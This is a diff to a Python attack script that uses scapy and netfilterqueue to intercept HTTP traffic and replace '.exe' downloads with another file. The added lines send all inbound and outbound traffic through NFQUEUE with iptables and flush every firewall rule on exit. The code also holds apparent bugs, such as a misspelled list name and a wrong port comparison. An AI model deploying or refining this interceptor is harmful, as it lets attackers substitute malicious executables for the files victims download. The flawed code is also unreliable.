@@ -1,11 +1,14 @@
 #!usr/bin/env python
 import scapy.all as scapy
 import netfilterqueue
+import subprocess
 
 ackList = []
+subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
+subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
 
 def set_load(scapyPacket, load):
-    scapyPacket[scapy.TCP].load = load
+    scapyPacket[scapy.Raw].load = load
     del scapyPacket[scapy.IP].len
     del scapyPacket[scapy.IP].chksum
     del scapyPacket[scapy.TCP].chksum
@@ -15,12 +18,12 @@ def process_packet(packet):
     scapyPacket = scapy.IP(packet.get_payload())
     if scapyPacket.haslayer(scapy.Raw):
         if scapyPacket[scapy.TCP].dport == 80:
-            print("HTTP Req")
+            print("[+] HTTP Req")
             if ".exe" in scapyPacket[scapy.Raw].load:
                 print("[+] exe Req")
                 ackList.append(scapyPacket[scapy.TCP].ack)
         elif scapyPacket[scapy.TCP] == 80:
-            print("HTTP Res")
+            print("[+] HTTP Res")
             if scapyPacket[scapy.TCP].seq in ack_list:
                 ackList.remove(scapyPacket[scapy.TCP].seq)
                 print("[+] Replacing file")
@@ -28,7 +31,10 @@ def process_packet(packet):
 
                 packet.set_payload(str(modifiedPacket))
     packet.accept()
-
-queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, process_packet)
-queue.run()
+try:
+    queue = netfilterqueue.NetfilterQueue()
+    queue.bind(0, process_packet)
+    queue.run()
+except KeyboardInterrupt:
+    print("\n\n[-] Closing...")
+    subprocess.call("iptables --flush", shell=True)
